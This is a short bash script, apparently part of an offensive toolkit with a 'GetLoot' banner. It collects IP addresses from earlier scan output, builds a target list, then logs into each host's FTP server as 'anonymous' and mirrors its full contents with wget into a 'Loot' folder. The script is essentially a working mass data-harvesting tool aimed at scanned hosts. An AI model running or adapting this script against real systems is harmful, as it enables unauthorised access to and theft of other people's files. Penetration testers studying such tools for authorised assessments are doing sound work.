#!/bin/bash

####################################### STATIC VARIABLES ########################################

# Text Color
WHITE="\033[0m"
RED="\033[0;31m"
YELLOW="\033[1;33m"
GREEN="\033[0;32m"

# Infinte Loop
ALWAYS_TRUE=true

# Regex
Integer='^[0-9]+$'

########################################### OVERVIEW ############################################

echo '''                                                                                              
                   mm    7MMF                          mm    
                   MM     MM                            MM    
 .PYbbmmm .gPPYa mmMMmm   MM         ,pWwWq.   ,pWwWq.mmMMmm  
:MI  I8  ,M    Yb  MM     MM        6W     Wb 6W     Wb MM    
 WmmmP   8M""""""  MM     MM      , 8M     M8 8M     M8 MM    
8M       YM.    ,  MM     MM     ,M YA.   ,A9 YA.   ,A9 MM    
 YMMMMMb  `Mbmmd   `Mbmo.JMMmmmmMMM  `Ybmd9    `Ybmd9   `Mbmo 
6      dP                                                     
Ybmmmdd                                                                                                                                                                                                                                                                   
'''

#
cat ./Outputs/grep*.txt | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" >> ScannedHosts.txt

# Remove network address

if [ -s ScannedHosts.txt ]; then
    # The file is not-empty.
    while read Host;
    do
        #
        if ! cat TargetHosts.txt | grep -q $Host;
        then
            echo $Host >> TargetHosts.txt
        fi
    done < ScannedHosts.txt
else
    # The file is empty.
    echo -e "${YELLOW}[FTP]${WHITE} No targets listening for FTP was found" && echo ""
fi

# Check if anonymous login is allowed on FTP
while read Host;
do
    #
    wget -m --no-passive ftp://anonymous:anonymous@$Host
    
    #
    mv $Host Loot/
done < TargetHosts.txt

# Cleanup
rm ScannedHosts.txt
rm TargetHosts.txt
